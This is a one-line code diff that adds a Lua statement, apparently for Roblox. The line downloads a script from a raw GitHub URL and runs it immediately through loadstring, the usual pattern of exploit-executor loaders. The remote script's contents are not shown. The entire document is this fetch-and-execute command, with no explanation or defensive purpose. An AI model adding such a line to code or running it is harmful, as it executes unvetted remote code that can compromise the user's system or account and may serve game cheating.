@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mercadezbeenzx/UnseenLiminality/main/script.lua"))()
